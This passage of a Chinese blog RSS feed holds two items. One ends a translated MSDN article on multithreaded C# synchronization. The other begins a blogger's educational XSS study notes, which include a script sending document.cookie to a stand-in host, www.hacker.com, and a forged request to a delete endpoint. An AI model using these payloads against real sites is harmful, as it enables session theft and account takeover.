&lt;span&gt;12&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; GetValue () {
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; _foo;
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; 
&lt;span&gt;16&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; SetValue (&lt;span&gt;string&lt;/span&gt;&lt;span&gt; value) {
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt;         _foo =&lt;span&gt; value;
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt; 
&lt;span&gt;21&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Foo (Synchronizer&amp;lt;MySharedClass, IReadFromShared, IWriteToShared&amp;gt;&lt;span&gt; sync) {
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;     sync.Write (x =&amp;gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;         x.SetValue (&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;new value&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt; &lt;span&gt;    });
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt;     sync.Read (x =&amp;gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; &lt;span&gt;        Console.WriteLine (x.GetValue ());
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt; &lt;span&gt;    })
&lt;/span&gt;&lt;span&gt;28&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;codeCaption&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;在图 2 的代码中，无论有多少线程在执行 Foo 方法，只要执行另一个 Read 或 Write 方法，就不会调用 Write 方法。不过，可以同时调用多个 Read 方法，而不必在代码中分散多个 try/catch/finally 语句，也不必不断重复相同的代码。我在此郑重声明，通过简单字符串来使用它是没有意义的，因为 System.String 不可变。我使用简单的字符串对象来简化示例。&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;基本思路是，必须将所有可以修改实例状态的方法都添加到 IWriteToShared 接口中。同时，应将所有只从实例读取内容的方法都添加到 IReadFromShared 接口中。通过将诸如此类的问题分散到两个不同的接口，并对基础类型实现这两个接口，可使用 Synchronizer 类来同步对实例的访问权限。这样一来，将访问权限同步到代码的做法变得更简单，并且基本上可以通过更具声明性的方式这样做。&lt;/p&gt;
&lt;p&gt;在多线程编程方面，语法糖可能会决定成败。调试多线程代码通常极为困难，并且创建同步对象的单元测试可能会是徒劳无功之举。&lt;/p&gt;
&lt;p&gt;如果需要，可以创建只包含一个泛型参数的重载类型，不仅继承自原始 Synchronizer 类，还将它的一个泛型参数作为类型参数三次传递到它的基类。这样一来，就不需要读取接口或写入接口了，因为可以直接使用类型的具体实现。不过，这种方法要求手动处理需要使用 Write 或 Read 方法的部分。此外，虽然它的安全性稍差一点，但确实可便于将无法更改的类包装到 Synchronizer 实例中。&lt;/p&gt;
&lt;h2&gt;用于分支的 lambda 集合&lt;/h2&gt;
&lt;p&gt;迈出第一步来使用神奇的 lambda（或在 C# 中称为“委托”）后，不难想象，可以利用它们完成更多操作。例如，反复出现的常见多线程主题是，让多个线程与其他服务器联系，以提取数据并将数据返回给调用方。&lt;/p&gt;
&lt;p&gt;最简单的例子就是，应用程序从 20 个网页读取数据，并在完成后将 HTML 返回给一个根据所有网页的内容创建某种聚合结果的线程。除非为每个检索方法都创建一个线程，否则此代码的运行速度比预期慢得多：99% 的所有执行时间可能会花在等待 HTTP 请求返回上。&lt;/p&gt;
&lt;p&gt;在一个线程上运行此代码的效率很低，并且线程创建语法非常容易出错。随着你支持多个线程及其助理对象，挑战变得更严峻，开发人员不得不在编写代码时使用重复代码。意识到可以创建委托集合和用于包装这些委托的类后，便能使用一个方法调用来创建所有线程。这样一来，创建线程就轻松多了。&lt;/p&gt;
&lt;p&gt;图 3 中的一段代码创建两个并行运行的此类 lambda。请注意，此代码实际上来自我的第一版 Lizzie 脚本语言的单元测试 (&lt;a href=&quot;http://bit.ly/2FfH5y8&quot;&gt;bit.ly/2FfH5y8&lt;/a&gt;)。&lt;/p&gt;
&lt;p&gt;图 3：创建 lambda&lt;/p&gt;
&lt;div class=&quot;codeCaption&quot; readability=&quot;9&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; ExecuteParallel_1 () {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;var&lt;/span&gt; sync = &lt;span&gt;new&lt;/span&gt; Synchronizer&amp;lt;&lt;span&gt;string&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt;&amp;gt; (&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;initial_&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; 
&lt;span&gt; 4&lt;/span&gt;     &lt;span&gt;var&lt;/span&gt; actions = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Actions ();
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;     actions.Add (() =&amp;gt; sync.Assign ((res) =&amp;gt; res + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;foo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;     actions.Add (() =&amp;gt; sync.Assign ((res) =&amp;gt; res + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;bar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; 
&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;    actions.ExecuteParallel ();
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; 
&lt;span&gt;10&lt;/span&gt;     &lt;span&gt;string&lt;/span&gt; result = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;     sync.Read (&lt;span&gt;delegate&lt;/span&gt; (&lt;span&gt;string&lt;/span&gt; val) { result =&lt;span&gt; val; });
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;     Assert.AreEqual (&lt;span&gt;true&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;initial_foobar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; == result || result == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;initial_barfoo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;仔细看看这段代码便会发现，计算结果并未假定我的两个 lambda 的执行存先后顺序。执行顺序并未明确指定，并且这些 lambda 是在不同的线程上执行。这是因为，使用图 3 中的 Actions 类，可以向它添加委托，这样稍后就能决定是要并行执行委托，还是按顺序执行委托。&lt;/p&gt;
&lt;p&gt;为此，必须使用首选机制创建并执行许多 lambda。在图 3 中可以看到前面提到的 Synchronizer 类，用于同步对共享字符串资源的访问权限。不过，它对 Synchronizer 使用了新方法 Assign，我并未在图 1中的列表内为 Synchronizer 类添加此方法。Assign 方法使用前面 Write 和 Read 方法中使用的相同“lambda 技巧”。&lt;/p&gt;
&lt;p&gt;若要研究 Actions 类的实现，请务必下载 Lizzie 版本 0.1，因为我在后面推出的版本中完全重写了代码，使之成为独立编程语言。&lt;/p&gt;
&lt;h2&gt;C# 中的函数式编程&lt;/h2&gt;
&lt;p&gt;大多数开发人员往往认为，C# 几乎与面向对象的编程 (OOP) 同义或至少密切相关，事实显然如此。不过，通过重新思考如何使用 C#，并深入了解它的各方面功能，解决一些问题就变得更加简单了。目前形式的 OOP 不太易于重用，原因很多是因为它是强类型。&lt;/p&gt;
&lt;p&gt;例如，如果重用一个类，就不得不重用初始类引用的每个类（在两种情况下，类都是通过组合和继承进行使用）。此外，类重用还会强制重用这些第三方类引用的所有类等。如果这些类是在不同的程序集中实现，必须添加各种各样的程序集，才能获得对一个类型上单个方法的访问权限。&lt;/p&gt;
&lt;p&gt;我曾经看过一个可以说明这个问题的类比：“虽然想要的是香蕉，但最终得到的是手拿香蕉的大猩猩，以及大猩猩所居住的热带雨林。” 将这种情况与使用更动态的语言（如 JavaScript）进行重用做比较，后者并不关心类型，只要它实现函数本身使用的函数即可。通过略微宽松类型方法生成的代码更灵活、更易于重用。委托可以实现这一点。&lt;/p&gt;
&lt;p&gt;可使用 C# 来改善跨多个项目重用代码的过程。只需要理解函数或委托也可以是对象，并且可以通过弱类型方式控制这些对象的集合。&lt;/p&gt;
&lt;p&gt;早在 2018 年 11 月发行的《MSDN 杂志》中，我发表过一篇标题为“使用符号委托创建你自己的脚本语言”的文章 (&lt;a href=&quot;http://msdn.com/magazine/mt830373&quot;&gt;msdn.com/magazine/mt830373&lt;/a&gt;)。本文中提到的有关委托的思路是在这篇文章的基础之上形成。本文还介绍了 Lizzie，这是我的自制脚本语言，它的存在归功于这种以委托为中心的思维模式。如果我使用 OOP 规则创建了 Lizzie，我会认为，它在大小上可能至少大一个数量级。&lt;/p&gt;
&lt;p&gt;当然，如今 OOP 和强类型处于主导地位，想要找到一个主要必需技能不要求它的职位描述，几乎是不可能的。我在此郑重声明，我创建 OOP 代码的时间已超过 25 年，所以，我与任何人一样都会因为对强类型有偏见而感到内疚。然而，如今我在编码方法上更加务实，对类层次结构的最终外观失去兴趣。&lt;/p&gt;
&lt;p&gt;并不是我不欣赏外观精美的类层次结构，而是收益递减。添加到层次结构中的类越多，它就变得越臃肿，直到因不堪重压而崩溃。有时，卓越的设计只用很少的方法、更少的类和大多数松散耦合的函数，这样就可以轻松扩展代码，也就不需要“引入大猩猩和热带雨林”了。&lt;/p&gt;
&lt;p&gt;回到本文反复出现的主题（从 Miles Davis 的音乐方法中获得灵感）：少即是多（“没有声音比有声音更重要”）。 代码也不例外。间断代码行往往会产生奇迹，最佳解决方案的衡量依据更多是不编码什么，而不是编码什么。连傻瓜也可以将喇叭吹响，但只有为数不多的人才能用喇叭吹奏出音乐。像 Miles 这样能创造出奇迹的人就更少了。&lt;/p&gt;

&lt;hr/&gt;&lt;p&gt; 原文作者：Thomas Hansen&lt;/p&gt;
&lt;p&gt;原文地址：&lt;a title=&quot;Minimize Complexity in Multithreaded C# Code&quot; href=&quot;https://msdn.microsoft.com/zh-cn/magazine/mt833270&quot; target=&quot;_blank&quot;&gt;Minimize Complexity in Multithreaded C# Code&lt;/a&gt;&lt;a href=&quot;http://csharpindepth.com/Articles/General/Singleton.aspx#performance&quot;&gt;&lt;br/&gt;&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 22 Mar 2019 14:34:00 +0000</pubDate>
<dc:creator>楚人Leo</dc:creator>
<og:description>分支或多线程编程是编程时最难最对的事情之一。这是由于它们的并行性质所致，即要求采用与使用单线程的线性编程完全不同的思维模式。对于这个问题，恰当类比就是抛接杂耍表演者，必须在空中抛接多个球，而不要让它们</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/leolion/p/10581723.html</dc:identifier>
</item>
<item>
<title>前端Hack之XSS攻击个人学习笔记 - Yunen的博客</title>
<link>http://www.cnblogs.com/yunen/p/10581320.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yunen/p/10581320.html</guid>
<description>&lt;p&gt;**&lt;br/&gt;       此篇系本人两周来学习XSS的一份个人总结，实质上应该是一份笔记，方便自己日后重新回来复习，文中涉及到的文章我都会在末尾尽可能地添加上，此次总结是我在学习过程中所写，如有任何错误，敬请各位读者斧正。其中有许多内容属于相关书籍、文章的部分摘取，如有侵权，请联系我修改。(asp-php#foxmail.com)&lt;br/&gt;**&lt;br/&gt;&lt;/p&gt;
&lt;h2 id=&quot;什么是xss&quot;&gt;1) 什么是XSS?&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;&lt;br/&gt;       XSS(Cross-Site Script,跨站脚本)是由于web应用程序对用户的输入过滤不足而产生的一种漏洞。攻击者可以利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码，对受害者产生各种攻击。&lt;br/&gt;&lt;/strong&gt;&lt;br/&gt;       如果对以上描述还不是很了解的话，可以参考&lt;a href=&quot;https://baike.baidu.com/item/xss/917356&quot;&gt;百度百科&lt;/a&gt;&lt;br/&gt;       在&lt;strong&gt;余弦大大&lt;/strong&gt;和&lt;strong&gt;xisigr大大&lt;/strong&gt;的书籍《Web前端安全技术揭秘》第三章中这样说道：&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;跨站脚本的重点不在“跨站”上，而应该在“脚本”上...因为这个“跨”实际上属于浏览器的特性，而不是缺陷，造成“跨”的假象是因为绝大多数的XSS攻击都会采用嵌入一段远程或者说第三方域上的脚本资源。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;       确实，当攻击者的服务器上的js嵌入到受害者的页面，至于接下来的攻击就是关于“脚本”的事了。&lt;/p&gt;
&lt;h2 id=&quot;xss可以带来哪些危害&quot;&gt;2) XSS可以带来哪些危害？&lt;/h2&gt;
&lt;p&gt;       对于XSS攻击的危害，大多数的人们却没有正确的认识，实际上攻击者可以利用XSS攻击造成巨大的危害。比如：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;网页挂马;&lt;/li&gt;
&lt;li&gt;盗取Cookie;&lt;/li&gt;
&lt;li&gt;DoS攻击;&lt;/li&gt;
&lt;li&gt;钓鱼攻击;&lt;/li&gt;
&lt;li&gt;蠕虫攻击;&lt;/li&gt;
&lt;li&gt;劫持用户web行为;&lt;/li&gt;
&lt;li&gt;结合CSRF进行针对性攻击;&lt;/li&gt;
&lt;li&gt;······&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这些都是可以利用XSS漏洞来达成的。&lt;/p&gt;
&lt;h2 id=&quot;xss类型&quot;&gt;3) XSS类型&lt;/h2&gt;
&lt;p&gt;目前的XSS总共可以分为三种类型：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;反射型(也叫非持久型)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;存储型(也叫持久型)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DOM型&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;PS：前两种XSS都会与服务器产生交互，后一种不会产生交互。(某安全大佬面试)&lt;/p&gt;
&lt;h3 id=&quot;反射型xss&quot;&gt;反射型XSS&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;&lt;br/&gt;       反射型XSS，也称非持久型XSS，最常见也是使用最广的一种。在反射型XSS中，payload一般存在于网页的Url中，只用户单击时触发，只执行一次，非持久化，故称反射型XSS。攻击者发送恶意Url链接让受害者点击(一般会对payload部分进行处理，如：编码转换和短域名跳转)&lt;br/&gt;&lt;/strong&gt;&lt;br/&gt;       由于篇幅问题，关于反射型XSS我就不做过多简述。&lt;br/&gt;       有的人认为反射型XSS需要用户已经登陆的情况下才能利用，其实不然。我们可以通过反射型xss让浏览器远程嵌入我们的js文件，然后配合浏览器漏洞进行RCE攻击。这里给出个相近的例子：&lt;a href=&quot;https://xz.aliyun.com/t/3919&quot;&gt;记一次从DOM型XSS到RCE过程&lt;/a&gt;。&lt;/p&gt;
&lt;h3 id=&quot;存储型xss&quot;&gt;存储型XSS&lt;/h3&gt;
&lt;p&gt;       &lt;strong&gt;存储型XSS，也称持久型XSS，攻击者首先将恶意javascript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意javascript页面就会执行恶意代码，不需要用户点击特定Url就能执行，故存储型XSS比反射型XSS更具威胁性。--- 《XSS跨站脚本攻击剖析与防御》&lt;/strong&gt;&lt;br/&gt;       存储型XSS与反射型XSS最大的区别就在于提交的XSS代码会储存于服务端，下次再访问目标页面时不用再提交XSS代码。---《Web前端黑客技术揭秘》&lt;/p&gt;
&lt;h3 id=&quot;dom型xss&quot;&gt;DOM型XSS&lt;/h3&gt;
&lt;p&gt;       &lt;strong&gt;许多朋友对反射型XSS和存储型XSS都比较清楚，可是却不太了解什么是DOM型XSS，没关系，看完这里你就应该会对DOM型XSS有个大概认识&lt;br/&gt;       DOM,即Document Object Model(文件对象模型)的缩写，关于DOM的概念想了解的朋友可以在&lt;a href=&quot;https://baike.baidu.com/item/DOM/50288&quot;&gt;百度百科&lt;/a&gt;得到相应的解答。&lt;/strong&gt;&lt;br/&gt;       DOM型XSS是如何产生的？我们知道，客户端javascipt是可以访问浏览器的DOM文本对象模型，如果没有经过适当的过滤和消毒，那么应用程序可能会受到基于DOM的XSS攻击。&lt;br/&gt;       在&lt;strong&gt;刺&lt;/strong&gt;的《白帽子讲Web安全》是这样讲的：&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS，也就是DOM型XSS。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;       举个简单的例子(来自《Web前端黑客技术揭秘》)：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;html&amp;gt;
...
&amp;lt;script&amp;gt;
var a=document.URL;
document.write(a.substring(a.indexOf(&quot;a=&quot;)+2,a.length));
&amp;lt;/script&amp;gt;
...
&amp;lt;/html&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;       把以上代码保存为1.html,然后打开浏览器访问&lt;code&gt;http://127.0.0.1/1.html#a=test&lt;/code&gt;&lt;br/&gt;       我们知道这是个静态页面，而且#后边的内容并不会传给服务器。&lt;br/&gt;&lt;img src=&quot;https://i.loli.net/2019/03/09/5c839d5c04d33.png&quot; alt=&quot;访问结果&quot;/&gt;&lt;br/&gt;       可是这样就不会产生XSS漏洞了吗？如果我们访问&lt;br/&gt;&lt;code&gt;http://127.0.0.1/.html#a=&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;br/&gt;       当我们访问上述url时，服务器会返回源代码，我们可以用抓包工具截取，发现与正常访问的页面无差别，可是当浏览器收到源代码时便把HTML文本解析成DOM对象并执行，结果弹出/xss/消息框，感兴趣的朋友可以试试。&lt;br/&gt;       具体执行过程如图：&lt;img src=&quot;https://i.loli.net/2019/03/09/5c83cca814d51.jpg&quot; alt=&quot;来自《黑客攻防技术宝典Web实战篇》&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;xss的利用方式&quot;&gt;4) XSS的利用方式&lt;/h2&gt;
&lt;p&gt;       前面我们介绍了各种XSS的特点及产生方式，现在我们来说说如何利用这些漏洞。&lt;/p&gt;
&lt;h3 id=&quot;cookie窃取&quot;&gt;Cookie窃取&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;       Cookie盗取是xss攻击中最实用也是最广泛的一种利用方式之一。我们知道Cookie是Web系统识别用户的身份和保存会话状态的主要机制，且是由服务器提供的、存储在客户端的一种数据。同时，对于cookie的操作十分的方便，我们可以通过Document对象访问Cookie。如：&lt;code&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;会弹出当前页面的cookie信息。&lt;/strong&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;       这里我们引入一个叫做“同源策略”的概念：&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;首先，同“源”的源不单单是指两个页面的主域名，还包括这两个域名的协议、端口号和子级域名相同。举个例子，假设我现在有一个页面&lt;code&gt;http://www.a.com/index.html&lt;/code&gt;，域名是 &lt;code&gt;www.a.com&lt;/code&gt;，二级域名为 www,协议是 http，端口号是默认的 80，这个页面的同源情况如下：&lt;img src=&quot;https://i.loli.net/2019/03/10/5c84907479e30.jpg&quot;/&gt;&lt;br/&gt;       同源策略存在的意义就是为了保护用户的信息的安全。一般网站都会把关于用户的一些敏感信息存在浏览器的 cookie 当中试想一下，如果没有同源策略的保护，那么 b 页面也可以随意读取 a 页面存储在用户浏览器 cookie 中的敏感信息，就会造成信息泄露。如果用户的登录状态被恶意网站能够随意读取，那后果不堪设想。由此可见，同源策略是非常必要的，可以说是浏览器安全的基石。&lt;br/&gt;       除了 cookie 的访问受到同源策略的限制外，还有一些操作也同样受到同源策略的限制：&lt;br/&gt;       (1) 无法读取非同源网页的 Cookie 、sessionStorage 、localStorage 、IndexedDB&lt;br/&gt;       (2) 无法读写非同源网页的 DOM&lt;br/&gt;       (3) 无法向非同源地址发送 AJAX请求（可以发送，但浏览器会拒绝响应而报错）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;       ————引自&lt;strong&gt;晚风&lt;/strong&gt;表哥在信安之路上的投稿文章&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;amp;mid=2247487543&amp;amp;idx=1&amp;amp;sn=924a5d5f37fa27d053187cf6a740ba8e&amp;amp;chksm=ec1e201fdb69a909bda97b7e5af3aaffb2853a95694310d2463fe139468b96a55cf7e25edc6c&amp;amp;mpshare=1&amp;amp;scene=23&amp;amp;srcid=#rd&quot;&gt;《同源策略与跨域请求》&lt;/a&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;       我们知道Cookie有如下常见的属性：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Domain————设置关联Cookie的域名;&lt;/li&gt;
&lt;li&gt;Expires————通过给定一个过期时间来创建一个持久化Cookie;&lt;/li&gt;
&lt;li&gt;Httponly————用于避免Cookie被Javascript访问;&lt;/li&gt;
&lt;li&gt;Name————Cookie的名称;&lt;/li&gt;
&lt;li&gt;Path————关联到Cookie的路径，默认为/;&lt;/li&gt;
&lt;li&gt;Value————读写Cookie的值;&lt;/li&gt;
&lt;li&gt;Secure————用于指定Cookie需要通过安全Socket层传递连接;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;       并且Cookie也可以安装类型分为：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;本地Cookie————即储存在计算机硬盘中，关闭浏览器后依旧存在;&lt;/li&gt;
&lt;li&gt;内存Cookie————即储存在内存中，随浏览器的关闭而消失;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;       如何区分两者很简单，只要判断cookie中的expires即过期时间属性有没有设置，如果设置了即为本地cookie，反之为内存cookie。&lt;br/&gt;       由于Cookie具有的不同属性，我们可以将不同属性的Cookie盗取方式分为以下几种情况&lt;/p&gt;
&lt;h4 id=&quot;默认&quot;&gt;默认&lt;/h4&gt;
&lt;p&gt;       默认情况，即不对Cookie的任何属性进行指定就设置Cookie的情况。这种情况下Cookie的获取最为简单。可以通过下列方式获取&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;script&amp;gt;
new Image().src=&quot;http://www.hacker.com/cookie.php?cookie=&quot;+document.cookie;
&amp;lt;/script&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;不同域&quot;&gt;不同域&lt;/h4&gt;
&lt;p&gt;       这是由于domain字段的机制导致的。一个Cookie如果不知道domain的值，则默认为&lt;strong&gt;本域&lt;/strong&gt;。&lt;br/&gt;       例如有两个网站&lt;code&gt;www.a.com&lt;/code&gt;和&lt;code&gt;test.a.com&lt;/code&gt;且后者存在xss漏洞，按照同源策略，这两个网站是不同源的，默认情况下我们无法直接从&lt;code&gt;test.a.com&lt;/code&gt;获取到&lt;code&gt;www.a.com&lt;/code&gt;的Cookie，可是如果&lt;code&gt;www.a.com&lt;/code&gt;的Cookie值中的domain属性设置为父级域即&lt;code&gt;a.com&lt;/code&gt;，就可以通过&lt;code&gt;test.a.com&lt;/code&gt;的xss漏洞获取到&lt;code&gt;www.a.com&lt;/code&gt;的Cookie值。&lt;/p&gt;
&lt;h4 id=&quot;不同路径&quot;&gt;不同路径&lt;/h4&gt;
&lt;p&gt;       这是由于path字段的机制导致的。在设置Cookie时，如果不指定path的值，默认就是目标页面的路径。比如在&lt;code&gt;www.a.com/admin/index.php&lt;/code&gt;设置cookie值且不知道path，那么path默认为&lt;code&gt;/admin/&lt;/code&gt;。javascript可以指定任意路径的cookie，但是只有对于path值的目录下才能读取Cookie,即上述例子中只有&lt;code&gt;/admin/&lt;/code&gt;目录下的javascipt才能读取前边设置的Cookie。&lt;/p&gt;
&lt;h4 id=&quot;http-only&quot;&gt;Http Only&lt;/h4&gt;
&lt;p&gt;       HttpOnly是指仅在Http层面上传输的Cookie，当设置了HttpOnly标志后，客户端脚本就无法读取该Cookie，这样做能有效防御XSS攻击获取Cookie，也是目前防御XSS的主流手段之一。不过利用某些特定方式也可以同样读取到标志了HttpOnly的Cookie。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;利用调试信息，如：PHP的phpinfo()和Django的调试信息，里边都记录了Cookie的值，且标志了HttpOnly的Cookie也同样可以获取到。&lt;/li&gt;
&lt;li&gt;利用Apache Http Server 400错误暴露HttpOnly Cookie的特点。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;感兴趣的朋友可以查阅相关资料(《Web前端黑客技术揭秘》p36-39)&lt;/p&gt;
&lt;h4 id=&quot;secure&quot;&gt;Secure&lt;/h4&gt;
&lt;p&gt;       Secure是指设置了Secure的Cookie尽在HTTPS层面上进行安全传输，如果请求是HTTP的，则不会带上改Cookie，这样做的好处是可以降低Cookie对中间人攻击获取的风险，不过对我们此处讨论的XSS攻击无拦截效果，可通过默认情况下获取。&lt;/p&gt;
&lt;h4 id=&quot;p3p&quot;&gt;P3P&lt;/h4&gt;
&lt;p&gt;       HTTP响应头的P3P字段可以用于标识是否允许目标网站的Cookie被另一域通过加载目标网站而设置或发送，据说仅IE支持（17年）。&lt;br/&gt;       我们来举个例子，在A域通过iframe等方式加载B域(此时也称B域为第三方域)，如果我们想通过B域来设置A域的Cookie，或加载B域时带上B域的Cookie，这时就得涉及到P3P。&lt;/p&gt;
&lt;h5 id=&quot;b域设置a域cookie&quot;&gt;B域设置A域Cookie&lt;/h5&gt;
&lt;p&gt;       在IE下默认是不允许第三方域设置的的，除非A域在响应头带上P3P字段。当响应头头带上P3P后，IE下第三方域即可进行对A域Cookie的设置，且设置的Cookie会带上P3P属性，一次生效，即使之后没有P3P头也有效。&lt;/p&gt;
&lt;h5 id=&quot;加载b域时cookie传入问题&quot;&gt;加载B域时Cookie传入问题&lt;/h5&gt;
&lt;p&gt;       我们知道Cookie分为内存Cookie和本地Cookie，当我们通过A域加载B域时，默认是带内存Cookie加载(如果无内存Cookie则不带)，而如果想要带本地Cookie加载，则本地Cookie必须带P3P属性。&lt;/p&gt;
&lt;h3 id=&quot;会话劫持&quot;&gt;会话劫持&lt;/h3&gt;
&lt;p&gt;       由于Cookie的不安全性，开发者们开始使用一些更为安全的认证方式——Session。&lt;br/&gt;       这里引用《XSS跨站脚本攻击剖析与防御》p51-52页的内容&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;       Session的中文意思是会话，其实就是访问者从到达特定主页到离开的那段时间，在这个过程中，每个访问者都会得到一个单独的Session。Session是给予访问的进程，记录了一个访问的开始到结束，搭档浏览器或进程关闭之后，Session也就“消失”了。&lt;br/&gt;       在Session机制中，客户端和服务端也有被其他人利用的可能。&lt;br/&gt;       Session和Cookie最大的区别在于：Session是保存在服务端的内存里面，而Cookie保存于浏览器或客户端文件里面&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;       这里提到Session是因为我们在现实情况中可能会出现已经获取到了Cookie，但是由于用户已经退出了浏览器指示Session无效，导致我们无法通过Cookie欺骗来获取用户权限；又比如有的网站设置了HttpOnly，获取不到Cookie；再者有的网站将Cookie与客户端IP向绑定；此时我们便可以利用会话劫持来达到目的。&lt;br/&gt;       会话劫持的实质就是模拟GET/POST请求(带Cookie)通过受害者浏览器发送给服务器，我们可以通过下面的方式来完成。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;通过javascript控制DOM对象来发起一个GET请求，如：&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;var img = document.creatElement(&quot;img&quot;);
img.src = &quot;http://www.a.com/del.php?id=1&quot;;
document.body.appendChild(img);&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;通过javascript自动构造隐藏表单并提交(POST)&lt;/li&gt;
&lt;li&gt;通过XMLHttpRequest直接发送一个POST请求&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;       我们可以通过构造的GET/POST请求来实现如添加管理员、删除文章、上传文件等操作。XSS蠕虫从某种意义上来说也属于会话劫持。&lt;/p&gt;
&lt;h3 id=&quot;钓鱼&quot;&gt;钓鱼&lt;/h3&gt;
